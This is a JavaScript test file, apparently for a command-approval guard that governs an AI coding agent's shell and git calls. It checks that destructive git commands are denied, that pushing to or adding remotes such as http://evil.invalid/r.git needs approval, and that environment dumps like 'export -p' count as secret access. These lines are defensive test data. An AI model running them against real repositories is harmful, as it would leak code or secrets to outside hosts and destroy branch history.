  }
  assert.notEqual(run("& git status", ps).decision, "allow", "the call operator is never an understood form");
  assert.notEqual(run("& 'git' status", ps).decision, "allow");
  assert.equal(run("Get-ChildItem src", ps).decision, "allow");
});

// ---------------------------------------------------------------------------------------------
// Low items

test("low: stash clear and changes to the default branch ref are refused", () => {
  for (const command of ["git stash clear", "git branch -D main", "git branch -d master", "git branch --delete --force main", "git branch -f main HEAD~1", "git branch -M main", "git update-ref -d refs/heads/main", "git checkout -B main", "git switch -C master"]) {
    assert.equal(verdict(run(command)), "deny/DESTRUCTIVE_COMMAND", command);
  }
  for (const command of ["git branch", "git branch -a"]) assert.equal(run(command).decision, "allow", command);
  for (const command of ["git branch -D feat/x", "git stash list", "git stash", "git stash drop", "git checkout -b feat/y", "git update-ref refs/heads/feat HEAD"]) {
    assert.equal(verdict(run(command)), "require-approval/UNPARSEABLE_COMMAND", command); // not understood, but not destructive either
  }
});

test("probe findings: changing a remote, pushing to a URL and dumping the environment ask or deny", () => {
  for (const command of ["git remote add x http://evil.invalid/r.git", "git remote set-url origin http://evil.invalid/r.git", "git push https://evil.invalid/r.git feat", "git push git@evil.invalid:r.git feat"]) {
    assert.equal(verdict(run(command)), "require-approval/NETWORK_EGRESS", command);
  }
  assert.equal(run("git push /tmp/bare feat").decision, "deny", "a local path outside the workspace");
  for (const command of ["set", "export -p", "declare -p"]) assert.equal(verdict(run(command)), "deny/SECRET_ACCESS", command);
  assert.equal(run("git push origin feat").decision, "allow");
  assert.equal(run("set -e").reason, "UNPARSEABLE_COMMAND");
});

test("low: read-only git forms do not need the run lock; branch, tag, remote and config writes do", () => {
  const options = { ...contexts.posix, dialect: "posix" };
  for (const command of ["git branch", "git branch -a", "git tag", "git tag -l", "git remote -v", "git config --get user.name", "git status"]) assert.equal(classifyShell(command, options).mutating, false, command);
  for (const command of ["git stash list", "git branch -D x", "git tag v1", "git remote add o u", "git stash", "git config user.name x", "git commit -m x"]) assert.equal(classifyShell(command, options).mutating, true, command);
});

test("low: guard-built commands are quoted for POSIX and classified as posix on every platform", () => {
  const quoted = ["git", "add", shellQuote("a'b.txt")].join(" ");
  const result = classifyShell(quoted, { ...contexts.win32, dialect: "posix" });
  assert.deepEqual(result.segments[0].argv, ["git", "add", "a'b.txt"]);
  const git = (args) => evaluate({ type: "tool", tool: { name: "git", input: { args } } }, { mode: "supervised", env: {}, branchOf: () => "feat/x", remotesOf: () => ["origin"], ...contexts.win32 });
  assert.equal(git(["add", "a'b.txt"]).reason, "UNPARSEABLE_COMMAND", "the quoted argument is read as one word (not an understood form)");
  assert.equal(git(["status", "-s"]).decision, "allow");
  assert.equal(git(["reset", "--hard"]).reason, "DESTRUCTIVE_COMMAND");
  assert.equal(git(["push", "origin", "main"]).reason, "DEFAULT_BRANCH_PUSH");
  assert.equal(git(["push", "origin", "ma'in"]).reason, "UNPARSEABLE_COMMAND");
});

test("low: a whitespace-only hook argv[0] is rejected by the runtime, as the scaffold rejects it", () => {
  const entry = (argv) => [{ id: "h", event: "tool.before", kind: "validate", argv }];
  assert.deepEqual(validateHookEntries(entry(["node"])), []);
  for (const argv of [[""], ["   "], ["\t"], [" \n "]]) {
    assert.ok(validateHookEntries(entry(argv)).some((issue) => issue.includes("argv[0]")), JSON.stringify(argv));
  }
  assert.deepEqual(validateHookEntries(entry(["node", " "])), [], "later arguments may be blank");
});

test("policy file: a policy that lists push-branch without branches is POLICY_INVALID", () => {
  const dir = join(base, "policy-user");
  mkdirSync(dir, { recursive: true });
  const body = policy();
  delete body.autonomous.branches;
  writeFileSync(join(dir, "policy.json"), JSON.stringify(body));
  assert.throws(() => loadPolicy({ env: { ASTERWEAVE_CONFIG_DIR: dir } }), /autonomous\.branches is required/);
});
